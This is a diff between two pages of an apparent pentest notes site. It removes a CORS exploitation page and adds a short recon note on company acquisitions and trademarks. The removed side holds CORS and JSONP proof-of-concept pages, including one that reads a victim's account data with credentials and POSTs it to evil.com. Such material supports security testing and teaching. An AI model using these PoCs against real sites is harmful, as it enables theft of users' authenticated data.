@@ -9,9 +9,11 @@
 <meta name="generator" content="Hugo 0.119.0">
 
 
-  <meta name="description" content="# https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC Simple &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;CORS PoC Exploit&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;h1&gt;CORS Exploit&lt;br&gt;six2dez&lt;/h1&gt; &lt;hr&gt; &lt;div id=&#34;demo&#34;&gt; &lt;button type=&#34;button&#34; onclick=&#34;cors()&#34;&gt;Exploit&lt;/button&gt; &lt;/div&gt; &lt;script type=&#34;text/javascript&#34;&gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;&amp; this.status == 200) { document.getElementById(&#34;demo&#34;).innerHTML = this.responseText; } }; xhttp.open(&#34;GET&#34;, &#34;http://&lt;vulnerable-url&gt;&#34;, true); xhttp.withCredentials = true; xhttp.send(); } &lt;/script&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; Simple with headers &lt;html&gt; &lt;script&gt; var http = new XMLHttpRequest(); var url = &#39;Url&#39;;//Paste here Url var params = &#39;PostData&#39;;//Paste here POST data http." />
+  <meta name="description" content="Big companies usually have other brands, subsidiaries or simply have other names in the other countries. Not only that, but companies own patents, trademarks and have the most fiverse products that not always have the obvious company name in it.
+To search all assets that is related to a company, one can search in the following resources:
+https://contracts.justia.com/companies/, find registered and approved trademarks https://www.crunchbase.com/, company acquisitions " />
 
-  <title>CORS | caon.io</title>
+  <title>Company Acquisitions &amp; Trademarks | caon.io</title>
 
   <link rel="icon" type="image/svg+xml" href="/favicon/favicon.svg" />
 <link
@@ -32,36 +34,40 @@
   
   <meta
     property="og:title"
-    content="CORS"
+    content="Company Acquisitions & Trademarks"
   />
   <meta property="og:site_name" content="caon.io" />
-  <meta property="og:description" content="# https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC Simple &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;CORS PoC Exploit&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;h1&gt;CORS Exploit&lt;br&gt;six2dez&lt;/h1&gt; &lt;hr&gt; &lt;div id=&#34;demo&#34;&gt; &lt;button type=&#34;button&#34; onclick=&#34;cors()&#34;&gt;Exploit&lt;/button&gt; &lt;/div&gt; &lt;script type=&#34;text/javascript&#34;&gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;&amp; this.status == 200) { document.getElementById(&#34;demo&#34;).innerHTML = this.responseText; } }; xhttp.open(&#34;GET&#34;, &#34;http://&lt;vulnerable-url&gt;&#34;, true); xhttp.withCredentials = true; xhttp.send(); } &lt;/script&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; Simple with headers &lt;html&gt; &lt;script&gt; var http = new XMLHttpRequest(); var url = &#39;Url&#39;;//Paste here Url var params = &#39;PostData&#39;;//Paste here POST data http." />
+  <meta property="og:description" content="Big companies usually have other brands, subsidiaries or simply have other names in the other countries. Not only that, but companies own patents, trademarks and have the most fiverse products that not always have the obvious company name in it.
+To search all assets that is related to a company, one can search in the following resources:
+https://contracts.justia.com/companies/, find registered and approved trademarks https://www.crunchbase.com/, company acquisitions " />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://caon.io/exploitation/vulnerability/cors/" />
+<meta property="og:url" content="https://caon.io/recon/companyinformation/" />
 
-<meta property="article:section" content="Exploitation" />
+<meta property="article:section" content="Recon" />
 
 
   <meta name="twitter:card" content="summary" />
-<meta name="twitter:title" content="CORS" />
-  <meta name="twitter:description" content="# https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC Simple &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;CORS PoC Exploit&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;h1&gt;CORS Exploit&lt;br&gt;six2dez&lt;/h1&gt; &lt;hr&gt; &lt;div id=&#34;demo&#34;&gt; &lt;button type=&#34;button&#34; onclick=&#34;cors()&#34;&gt;Exploit&lt;/button&gt; &lt;/div&gt; &lt;script type=&#34;text/javascript&#34;&gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;&amp; this.status == 200) { document.getElementById(&#34;demo&#34;).innerHTML = this.responseText; } }; xhttp.open(&#34;GET&#34;, &#34;http://&lt;vulnerable-url&gt;&#34;, true); xhttp.withCredentials = true; xhttp.send(); } &lt;/script&gt; &lt;/center&gt; &lt;/body&gt; &lt;/html&gt; Simple with headers &lt;html&gt; &lt;script&gt; var http = new XMLHttpRequest(); var url = &#39;Url&#39;;//Paste here Url var params = &#39;PostData&#39;;//Paste here POST data http." />
+<meta name="twitter:title" content="Company Acquisitions & Trademarks" />
+  <meta name="twitter:description" content="Big companies usually have other brands, subsidiaries or simply have other names in the other countries. Not only that, but companies own patents, trademarks and have the most fiverse products that not always have the obvious company name in it.
+To search all assets that is related to a company, one can search in the following resources:
+https://contracts.justia.com/companies/, find registered and approved trademarks https://www.crunchbase.com/, company acquisitions " />
 
 
   <script type="application/ld+json">
   {
       "@context": "http://schema.org",
       "@type": "TechArticle",
-      "articleSection": "Exploitation",
-      "name": "CORS",
-      "url" : "https://caon.io/exploitation/vulnerability/cors/",
-      "headline": "CORS",
-      "description": "# https:\/\/github.com\/s0md3v\/Corsy python3 corsy.py -u https:\/\/example.com POC Simple \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eCORS PoC Exploit\u003c\/title\u003e \u003c\/head\u003e \u003cbody\u003e \u003ccenter\u003e \u003ch1\u003eCORS Exploit\u003cbr\u003esix2dez\u003c\/h1\u003e \u003chr\u003e \u003cdiv id=\u0022demo\u0022\u003e \u003cbutton type=\u0022button\u0022 onclick=\u0022cors()\u0022\u003eExploit\u003c\/button\u003e \u003c\/div\u003e \u003cscript type=\u0022text\/javascript\u0022\u003e function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 \u0026\u0026 this.status == 200) { document.getElementById(\u0022demo\u0022).innerHTML = this.responseText; } }; xhttp.open(\u0022GET\u0022, \u0022http:\/\/\u003cvulnerable-url\u003e\u0022, true); xhttp.withCredentials = true; xhttp.send(); } \u003c\/script\u003e \u003c\/center\u003e \u003c\/body\u003e \u003c\/html\u003e Simple with headers \u003chtml\u003e \u003cscript\u003e var http = new XMLHttpRequest(); var url = \u0027Url\u0027;\/\/Paste here Url var params = \u0027PostData\u0027;\/\/Paste here POST data http.",
-      "wordCount" : "272",
+      "articleSection": "Recon",
+      "name": "Company Acquisitions \u0026 Trademarks",
+      "url" : "https://caon.io/recon/companyinformation/",
+      "headline": "Company Acquisitions \u0026 Trademarks",
+      "description": "Big companies usually have other brands, subsidiaries or simply have other names in the other countries. Not only that, but companies own patents, trademarks and have the most fiverse products that not always have the obvious company name in it.\nTo search all assets that is related to a company, one can search in the following resources:\nhttps:\/\/contracts.justia.com\/companies\/, find registered and approved trademarks https:\/\/www.crunchbase.com\/, company acquisitions ",
+      "wordCount" : "66",
       "inLanguage": "en",
       "isFamilyFriendly": "true",
       "mainEntityOfPage": {
           "@type": "WebPage",
-          "@id": "https://caon.io/exploitation/vulnerability/cors/"
+          "@id": "https://caon.io/recon/companyinformation/"
       },
       "copyrightHolder" : "caon.io",
       "copyrightYear" : "0001",
@@ -144,7 +150,7 @@
   href="/custom.css"
   media="all"
 />
-  <link href="https://caon.io/exploitation/vulnerability/cors/" rel="canonical" type="text/html" />
+  <link href="https://caon.io/recon/companyinformation/" rel="canonical" type="text/html" />
 
 <!-- Made with Geekdoc theme https://github.com/thegeeklab/hugo-geekdoc -->
 
@@ -497,7 +503,7 @@
                 
                 <a
                   href="/recon/companyinformation"
-                  class="gdoc-nav__entry"
+                  class="gdoc-nav__entry is-active"
                 >
                   Company Information
                 </a>
@@ -2094,7 +2100,7 @@
                 
                 <a
                   href="/exploitation/vulnerability/cors"
-                  class="gdoc-nav__entry is-active"
+                  class="gdoc-nav__entry"
                 >
                   CORS
                 </a>
@@ -3697,151 +3703,20 @@
   <article
     class="gdoc-markdown gdoc-markdown__align--left"
   >
-    <h1>CORS</h1>
-    <pre tabindex="0"><code># https://github.com/s0md3v/Corsy
-python3 corsy.py -u https://example.com
-</code></pre><div class="gdoc-page__anchorwrap">
-    <h2 id="poc"
-    >
-        POC
-    </h2>
-</div>
-<div class="gdoc-page__anchorwrap">
-    <h3 id="simple"
-    >
-        Simple
-    </h3>
-</div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>CORS PoC Exploit<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>CORS Exploit<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>six2dez<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;demo&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;cors()&#34;</span><span class="p">&gt;</span>Exploit<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"> <span class="kd">function</span> <span class="nx">cors</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">   <span class="kd">var</span> <span class="nx">xhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl">   <span class="nx">xhttp</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">     <span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;demo&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">     <span class="p">}</span>
-</span></span><span class="line"><span class="cl">   <span class="p">};</span>
-</span></span><span class="line"><span class="cl"> <span class="nx">xhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;http://&lt;vulnerable-url&gt;&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"> <span class="nx">xhttp</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"> <span class="nx">xhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"> <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span></code></pre></div><div class="gdoc-page__anchorwrap">
-    <h2 id="simple-with-headers"
-    >
-        Simple with headers
-    </h2>
-</div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;Url&#39;</span><span class="p">;</span><span class="c1">//Paste here Url
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="s1">&#39;PostData&#39;</span><span class="p">;</span><span class="c1">//Paste here POST data
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">//Send the proper header information along with the request
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">http</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-type&#39;</span><span class="p">,</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nx">http</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="c1">//Call a function when the state changes.
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">http</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nx">alert</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nx">http</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span></code></pre></div><div class="gdoc-page__anchorwrap">
-    <h3 id="data-leakage"
-    >
-        Data leakage
-    </h3>
-</div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#39;button&#39;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#39;cors()&#39;</span><span class="p">&gt;</span>CORS<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;corspoc&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">cors</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">xhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhttp</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span> <span class="c1">// Sensitive data from target1337.com about user account
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;corspoc&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">a</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="s2">&#34;https://evil.com&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span><span class="c1">// Sending that data to Attacker&#39;s website
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">xhttp</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;data=&#34;</span><span class="o">+</span><span class="nx">a</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="s2">&#34;https://target1337.com&#34;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhttp</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="s2">&#34;requestcontent&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aBody</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">aBody</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nx">aBody</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">body</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl"><span class="nx">xhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span><span class="nx">aBody</span><span class="p">]));</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span></code></pre></div><div class="gdoc-page__anchorwrap">
-    <h3 id="jsonp"
-    >
-        JSONP
-    </h3>
-</div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>JSONP PoC<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>JSONP Exploit<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>YourTitle<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">hr</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;demo&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;button&#34;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;trigger()&#34;</span><span class="p">&gt;</span>Exploit<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">testjsonp</span><span class="p">(</span><span class="nx">myObj</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">myObj</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;demo&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">result</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="c1">//console.log(myObj)
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">s</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&#34;https://&lt;vulnerable-endpoint&gt;?callback=testjsonp&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span></code></pre></div>
+    <h1>Company Acquisitions &amp; Trademarks</h1>
+    <p>Big companies usually have other brands, subsidiaries or simply have other names in the other countries. Not only that, but companies own patents, trademarks and have the most fiverse products that not always have the obvious company name in it.</p>
+<p>To search all assets that is related to a company, one can search in the following resources:</p>
+<ul>
+<li><a
+  class="gdoc-markdown__link"
+  href="https://contracts.justia.com/companies/"
+>https://contracts.justia.com/companies/</a>, find registered and approved trademarks</li>
+<li><a
+  class="gdoc-markdown__link"
+  href="https://www.crunchbase.com/"
+>https://www.crunchbase.com/</a>, company acquisitions</li>
+</ul>
+
   </article>
 
 
@@ -3980,141 +3855,8 @@ python3 corsy.py -u https://example.com
       
 
       
-
-      
-    
-
-    
-    
-  
-    
-    
-
-    
-    
-
-    
-    
-      
-  
-  
-
-  
-    
-    
-
-    
-    
-      
-      
-      
-
-      
         
-      
-      
-
-      
-
-      
-
-      
-    
-
-    
-    
-  
-    
-    
-
-    
-    
-      
-      
-      
-
-      
         
-      
-      
-
-      
-
-      
-
-      
-    
-
-    
-    
-  
-
-    
-  
-    
-    
-
-    
-    
-      
-      
-      
-
-      
-        
-      
-      
-
-      
-
-      
-
-      
-    
-
-    
-    
-  
-    
-    
-
-    
-    
-      
-      
-      
-
-      
-        
-      
-      
-
-      
-
-      
-
-      
-    
-
-    
-    
-  
-    
-    
-
-    
-    
-      
-      
-      
-
-      
-        
-      
-      
-
-      
-
       
 
       
@@ -4151,6 +3893,9 @@ python3 corsy.py -u https://example.com
       
 
       
+        
+        
+      
 
       
 
@@ -4158,6 +3903,33 @@ python3 corsy.py -u https://example.com
     
 
     
+    
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+  
+
     
   
     
@@ -4237,49 +4009,6 @@ python3 corsy.py -u https://example.com
 
     
     
-      
-      
-      
-
-      
-        
-      
-      
-
-      
-
-      
-
-      
-    
-
-    
-    
-  
-
-    
-  
-
-    
-  
-    
-    
-
-    
-    
-
-    
-    
-      
-  
-  
-
-  
-    
-    
-
-    
-    
 
     
     
@@ -4336,8 +4065,96 @@ python3 corsy.py -u https://example.com
     
     
   
+    
+    
 
     
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
+        
+      
+      
+
+      
+
+      
+
+      
+    
+
+    
+    
+  
+
+    
+  
+
+    
+  
+    
+    
+
+    
+    
+
+    
+    
+      
+  
+  
+
   
     
     
@@ -4464,29 +4281,21 @@ python3 corsy.py -u https://example.com
     
     
   
+
+    
+  
+    
+    
+
     
     
 
     
     
       
-      
-      
+  
+  
 
-      
-        
-      
-      
-
-      
-
-      
-
-      
-    
-
-    
-    
   
     
     
@@ -4511,22 +4320,6 @@ python3 corsy.py -u https://example.com
 
     
     
-  
-
-    
-  
-    
-    
-
-    
-    
-
-    
-    
-      
-  
-  
-
   
     
     
@@ -4776,6 +4569,70 @@ python3 corsy.py -u https://example.com
     
     
   
+
+    
+  
+    
+    
+
+    
+    
+
+    
+    
+      
+  
+  
+
+  
+    
+    
+
+    
+    
+      
+      
+      
+
+      
